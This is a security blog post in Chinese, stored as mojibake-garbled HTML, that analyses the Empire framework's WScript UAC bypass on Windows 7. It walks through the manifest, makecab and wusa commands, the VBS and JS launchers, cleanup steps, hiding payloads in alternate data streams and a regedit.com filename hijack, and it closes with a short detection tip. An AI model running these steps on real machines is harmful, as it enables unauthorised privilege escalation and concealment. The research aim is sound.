I"‘&<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>çŸ¥åçš„åæ¸—é€æµ‹è¯•æ¡†æ¶Empireæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å­¦ä¹ æ¨¡æ¿ï¼Œå…¶ä¸­åŒ…å«çš„åæ¸—é€æŠ€å·§å¾ˆå€¼å¾—æ·±å…¥ç ”ç©¶ã€‚</p>

<p>æœ¬æ–‡å°†è¦æŒ‘é€‰Empireä¸­ä¸€ä¸ªç»å…¸çš„UACç»•è¿‡æ–¹æ³•Invoke-WScriptBypassUACè¿›è¡Œåˆ†æï¼Œä»‹ç»ç»•è¿‡åŸç†ä»¥åŠåœ¨æ¸—é€æµ‹è¯•ä¸­çš„æ›´å¤šåˆ©ç”¨æŠ€å·§ã€‚çŸ¥é“å¦‚ä½•åˆ©ç”¨ï¼Œæ‰èƒ½çŸ¥é“å¦‚ä½•é˜²å¾¡ã€‚</p>

<p>Invoke-WScriptBypassUACåœ°å€ï¼š</p>

<p>https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-WScriptBypassUAC.ps1</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»å¦‚ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>Invoke-WScriptBypassUACç»•è¿‡åŸç†</li>
  <li>åˆ©ç”¨æ‰©å±•</li>
  <li>é˜²å¾¡æ£€æµ‹</li>
</ul>

<h2 id="0x02-invoke-wscriptbypassuacç»•è¿‡åŸç†">0x02 Invoke-WScriptBypassUACç»•è¿‡åŸç†</h2>
<hr />

<p>Invoke-WScriptBypassUACé€šè¿‡powershellå®ç°ï¼Œæ€è·¯ä¸Šå€Ÿé‰´äº†Vozzieåˆ†äº«çš„githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/Vozzie/uacscript</p>

<p>Vozzieæåˆ°ZDIå’Œå¾®è½¯é€‰æ‹©å¿½ç•¥è¯¥UACç»•è¿‡â€œæ¼æ´â€ï¼ŒZDIè®¤ä¸ºè¿™ä¸æ˜¯ä¸€ä¸ªè¿œç¨‹æ¼æ´ï¼Œå¾®è½¯è®¤ä¸ºUACç»•è¿‡ä¸å±äºæ¼æ´èŒƒç•´</p>

<p>Invoke-WScriptBypassUACåœ¨å®ç°ä¸Šä½¿ç”¨äº†ä¸€äº›å®ç”¨çš„å°æŠ€å·§ï¼Œæ‰€ä»¥æœ¬æ–‡ä¸»è¦å¯¹Invoke-WScriptBypassUACçš„ç»•è¿‡æ–¹æ³•è¿›è¡Œåˆ†æ</p>

<p>è¯¥æ–¹æ³•åªé€‚ç”¨äºWin7ï¼Œè€ŒWin8ã€Win10ä¸é€‚ç”¨ï¼ˆåŸå› åœ¨åé¢ä»‹ç»ï¼‰</p>

<p>æµ‹è¯•ç³»ç»Ÿï¼š Win7 x86</p>

<p>ç”±äºpowershellæ ¼å¼çš„æºä»£ç å…¬å¼€ï¼Œæ‰€ä»¥ç›´æ¥ä»‹ç»è¯¥è„šæœ¬å…³é”®çš„æ“ä½œæµç¨‹ï¼š</p>

<ol>
  <li>åˆ¤æ–­æ“ä½œç³»ç»Ÿæ˜¯å¦ä¸ºWin7ï¼Œæ˜¯å¦ä¸ºæ™®é€šæƒé™</li>
  <li>Tempç›®å½•é‡Šæ”¾æ–‡ä»¶wscript.exe.manifest</li>
  <li>ä½¿ç”¨makecab.exeå¯¹wscript.exe.manifestå’Œwscript.exeè¿›è¡Œå‹ç¼©</li>
  <li>ä½¿ç”¨wusaå°†å‹ç¼©åŒ…è§£å‹ç¼©ï¼Œå°†wscript.exe.manifestå’Œwscript.exeé‡Šæ”¾è‡³c:\Windowsç›®å½•</li>
  <li>payloadä¿å­˜åœ¨Appdataæ–‡ä»¶å¤¹çš„ADSä¸­</li>
  <li>ä½¿ç”¨c:\Windows\wscript.exeæ‰§è¡Œpayloadï¼Œå®ç°ç®¡ç†å‘˜æƒé™æ‰§è¡Œpayloadï¼Œç»•è¿‡UAC</li>
</ol>

<h2 id="0x03-åˆ©ç”¨æ‰©å±•">0x03 åˆ©ç”¨æ‰©å±•</h2>
<hr />

<p>æŒæ¡æ“ä½œæµç¨‹åï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥æ‰‹åŠ¨è¿›è¡Œæ‹†åˆ†æµ‹è¯•ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­èƒ½å‘ç°æ›´å¤šåˆ©ç”¨æ€è·¯</p>

<h3 id="1ä¿å­˜wscriptexemanifestæ–‡ä»¶">1ã€ä¿å­˜wscript.exe.manifestæ–‡ä»¶</h3>

<p>ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1"
          xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
          manifestVersion="1.0"&gt;
  &lt;asmv3:trustInfo&gt;
    &lt;security&gt;
      &lt;requestedPrivileges&gt;
        &lt;requestedExecutionLevel level="RequireAdministrator" uiAccess="false"/&gt;
      &lt;/requestedPrivileges&gt;
    &lt;/security&gt;
  &lt;/asmv3:trustInfo&gt;
  &lt;asmv3:application&gt;
    &lt;asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings"&gt;
      &lt;autoElevate&gt;true&lt;/autoElevate&gt;
      &lt;dpiAware&gt;true&lt;/dpiAware&gt;
    &lt;/asmv3:windowsSettings&gt;
  &lt;/asmv3:application&gt;
&lt;/assembly&gt;
</code></pre></div></div>

<h3 id="2ä½¿ç”¨makecabåˆ¶ä½œcabæ–‡ä»¶">2ã€ä½¿ç”¨makecabåˆ¶ä½œcabæ–‡ä»¶</h3>

<p>cmd:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecab c:\windows\system32\wscript.exe %TMP%\1.tmp
makecab wscript.exe.manifest %TMP%\2.tmp
</code></pre></div></div>

<h3 id="3ä½¿ç”¨wusaè§£å‹ç¼©cabæ–‡ä»¶å¹¶é‡Šæ”¾è‡³cwindows">3ã€ä½¿ç”¨wusaè§£å‹ç¼©cabæ–‡ä»¶å¹¶é‡Šæ”¾è‡³c:\windows</h3>

<p>cmd:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wusa %TMP%\1.tmp /extract:"c:\windows" /quiet
wusa %TMP%\2.tmp /extract:"c:\windows" /quiet
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¯¥æ–¹æ³•æˆåŠŸçš„å…³é”®åœ¨äºä½¿ç”¨wusaèƒ½å¤Ÿå°†cabæ–‡ä»¶è§£å‹ç¼©è‡³c:\windowsï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œå‘c:\windowsç›®å½•é‡Šæ”¾æ–‡ä»¶éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œè€Œå€ŸåŠ©wusaï¼Œæ™®é€šç”¨æˆ·æƒé™å³å¯ï¼Œå½“ç„¶å…¶ä»–ç®¡ç†å‘˜æƒé™çš„ç›®å½•ä¹Ÿå¯ä»¥ï¼Œä¾‹å¦‚ï¼š <code class="language-plaintext highlighter-rouge">C:\Windows\addins</code></p>

<h3 id="4ä½¿ç”¨è¯¥wscriptexeæ‰§è¡Œvbsæˆ–è€…jsè„šæœ¬">4ã€ä½¿ç”¨è¯¥wscript.exeæ‰§è¡Œvbsæˆ–è€…jsè„šæœ¬</h3>

<p>cmdï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\wscript.exe c:\test\1.vbs
c:\windows\wscript.exe c:\test\1.js
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>æ­¤å¤„jså’Œvbsè„šæœ¬éœ€è¦ç»å¯¹è·¯å¾„ï¼Œè™½ç„¶æ˜¯æ™®é€šç”¨æˆ·æƒé™çš„cmdï¼Œä½†å› ä¸ºwscript.exeåŒçº§ç›®å½•ä¸‹çš„wscript.exe.manifestæŒ‡å®šä»¥ç®¡ç†å‘˜æƒé™å¯åŠ¨ï¼Œæ‰€ä»¥æ‰§è¡Œçš„vbsæˆ–è€…jsè„šæœ¬æ˜¯ç®¡ç†å‘˜æƒé™ï¼Œè¿™å°±å®ç°äº†UACç»•è¿‡</p>

<p>æ‰§è¡Œcmdå‘½ä»¤å¯¹åº”çš„vbsè„šæœ¬å¦‚ä¸‹:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim objShell
Dim oFso
Set oFso = CreateObject("Scripting.FileSystemObject")
Set objShell = WScript.CreateObject("WScript.Shell")
command = "cmd /c calc.exe"
objShell.Run command, 0
Set objShell = Nothing
</code></pre></div></div>

<p>å¯¹åº”çš„jsè„šæœ¬å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe",0,true);
</code></pre></div></div>

<h3 id="5ç»•è¿‡åæ¸…é™¤ç¼“å­˜æ–‡ä»¶">5ã€ç»•è¿‡åæ¸…é™¤ç¼“å­˜æ–‡ä»¶</h3>

<p>åˆ é™¤c:\windows\ä¸‹çš„wscript.exeå’Œwscript.exe.manifest</p>

<p>å¯¹åº”vbsè„šæœ¬å¦‚ä¸‹:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim objShell
Dim oFso
Set oFso = CreateObject("Scripting.FileSystemObject")
Set objShell = WScript.CreateObject("WScript.Shell")
command = "cmd /c del c:\windows\wscript.exe &amp;&amp; del c:\windows\wscript.exe.manifest"
objShell.Run command, 0
Set objShell = Nothing
</code></pre></div></div>

<p>å¯¹åº”jsè„šæœ¬å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new ActiveXObject("WScript.Shell").Run("cmd /c del c:\\windows\\wscript.exe &amp;&amp; del c:\\windows\\wscript.exe.manifest",0,true);
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>åˆ é™¤c:\windows\ä¸‹çš„wscript.exeå’Œwscript.exe.manifestéœ€è¦ç®¡ç†å‘˜æƒé™</p>

<p>åˆ é™¤ç¼“å­˜æ–‡ä»¶ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>del %TMP%\1.tmp
del %TMP%\2.tmp
</code></pre></div></div>

<h3 id="6è¡¥å……">6ã€è¡¥å……</h3>

<p>(1)å¯ä¾›åˆ©ç”¨çš„è·¯å¾„æœ‰å¾ˆå¤šï¼ŒæŸ¥çœ‹æ–‡ä»¶å¤¹å±æ€§å¯ä½¿ç”¨å¦‚ä¸‹powershellå‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path c:\windows|select Owner
</code></pre></div></div>

<p>(2)ä¿å­˜vbsæˆ–è€…jsè„šæœ¬çš„è·¯å¾„æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚ç‰¹æ®Šadsï¼š</p>

<ul>
  <li>â€¦æ–‡ä»¶</li>
  <li>ç‰¹æ®ŠCOMæ–‡ä»¶</li>
  <li>ç£ç›˜æ ¹ç›®å½•</li>
</ul>

<p>æ›´å¤šç»†èŠ‚å¯å‚è€ƒæ–‡ç« <a href="https://3gstudent.github.io/Hidden-Alternative-Data-Streams%E7%9A%84%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7">ã€ŠHidden Alternative Data Streamsçš„è¿›é˜¶åˆ©ç”¨æŠ€å·§ã€‹</a></p>

<p>å½“ç„¶ï¼ŒInvoke-WScriptBypassUACä½¿ç”¨çš„ADSä½ç½®ä¹Ÿå¾ˆéšè”½</p>

<p><code class="language-plaintext highlighter-rouge">$env:USERPROFILE\AppData</code>é»˜è®¤ä¸ºç³»ç»Ÿéšè—æ–‡ä»¶</p>

<p>æ‰€ä»¥ä½¿ç”¨<code class="language-plaintext highlighter-rouge">dir /r</code>çœ‹ä¸åˆ°æ–‡ä»¶å¤¹<code class="language-plaintext highlighter-rouge">$env:USERPROFILE\AppData</code>ï¼Œå½“ç„¶ä¹Ÿæ— æ³•çœ‹åˆ°æ·»åŠ çš„ads</p>

<p>éœ€è¦ä½¿ç”¨<code class="language-plaintext highlighter-rouge">dir /a:h /r</code> ï¼ˆ/a:hæŒ‡å®šæŸ¥çœ‹ç³»ç»Ÿéšè—æ–‡ä»¶ï¼‰æ‰èƒ½çœ‹åˆ°ï¼Œæˆ–è€…æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶ï¼š<code class="language-plaintext highlighter-rouge">dir /a /r</code></p>

<p>(3)Win8å¤±è´¥çš„åŸå› </p>

<p>ä½¿ç”¨makecabå’Œwusaèƒ½å¤Ÿå°†cabæ–‡ä»¶è§£å‹ç¼©è‡³é«˜æƒé™ç›®å½•ï¼Œå¦‚c:\windows</p>

<p>ä½†åˆ©ç”¨wscript.exeå’Œwscript.exe.manifestå®ç°é«˜æƒé™æ‰§è¡Œçš„æ–¹æ³•å¤±æ•ˆï¼ŒWin8ä½¿ç”¨äº†å†…åµŒmanifest</p>

<p>(4)Win10å¤±è´¥çš„åŸå› </p>

<p>Win10ç³»ç»Ÿæ— æ³•ä½¿ç”¨makecabå’Œwusaèƒ½å¤Ÿå°†cabæ–‡ä»¶è§£å‹ç¼©è‡³é«˜æƒé™ç›®å½•ï¼Œå¦‚c:\windows</p>

<p>å½“ç„¶ï¼Œä¹Ÿä½¿ç”¨äº†å†…åµŒmanifest</p>

<h2 id="0x04-wusaç‰¹æ€§çš„è¿›ä¸€æ­¥åˆ©ç”¨">0x04 wusaç‰¹æ€§çš„è¿›ä¸€æ­¥åˆ©ç”¨</h2>
<hr />

<p><strong>wusaç‰¹æ€§ï¼š</strong></p>

<p>åœ¨æ™®é€šç”¨æˆ·çš„æƒé™ä¸‹ï¼Œèƒ½å¤Ÿå°†æ–‡ä»¶é‡Šæ”¾è‡³ç®¡ç†å‘˜æƒé™çš„æ–‡ä»¶å¤¹</p>

<p>é€‚ç”¨Win7ã€Win8</p>

<h3 id="åˆ©ç”¨ä¸€æ–‡ä»¶ååŠ«æŒ">åˆ©ç”¨ä¸€ï¼šæ–‡ä»¶ååŠ«æŒ</h3>

<p>1ã€å°†calc.exeé‡å‘½åä¸ºregedit.com</p>

<p>2ã€åœ¨c:\windowsé‡Šæ”¾æ–‡ä»¶regedit.com</p>

<p>cmdï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecab c:\test\regedit.com %TMP%\1.tmp
wusa %TMP%\1.tmp /extract:"c:\windows" /quiet
</code></pre></div></div>

<p>3ã€åŠ«æŒ</p>

<p>cmdè¾“å…¥regeditï¼Œä¼šæ‰§è¡Œregedit.comï¼Œè€Œä¸æ˜¯regedit.exe</p>

<p>å…³äºè¯¥åˆ©ç”¨æ–¹æ³•çš„è¯¦æƒ…å¯å‚è€ƒæ–‡ç« ï¼šã€ŠA dirty way of tricking users to bypass UACã€‹</p>

<h3 id="å…¶ä»–åˆ©ç”¨æ–¹æ³•æš‚ç•¥">å…¶ä»–åˆ©ç”¨æ–¹æ³•(æš‚ç•¥)</h3>

<h2 id="0x05-é˜²å¾¡">0x05 é˜²å¾¡</h2>
<hr />

<p>è¯¥UACç»•è¿‡æ–¹æ³•åªé€‚ç”¨äºWin7ï¼Œå°šæœªè§åˆ°å¯¹åº”è¡¥ä¸ï¼Œæ€æ¯’è½¯ä»¶èƒ½å¯¹æ­¤è„šæœ¬è¿›è¡Œæ‹¦æˆªï¼Œä½†ä¹Ÿå­˜åœ¨ç»•è¿‡æ–¹æ³•</p>

<p>ç«™åœ¨é˜²å¾¡è€…çš„è§’åº¦ï¼Œå»ºè®®ç›‘æ§wusa.exeçš„è°ƒç”¨</p>

<h2 id="0x06-å°ç»“">0x06 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡å¯¹Invoke-WScriptBypassUACè¿›è¡Œäº†åˆ†æï¼Œè™½ç„¶å¾®è½¯ä¸è®¤å¯è¯¥æ¼æ´ï¼Œä½†åœ¨åæ¸—é€é˜¶æ®µï¼Œä¸è®ºæ˜¯æ¸—é€æµ‹è¯•äººå‘˜ï¼Œè¿˜æ˜¯é˜²å¾¡æ–¹ï¼Œå¯¹æ­¤éƒ½åº”è¯¥æ³¨æ„ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET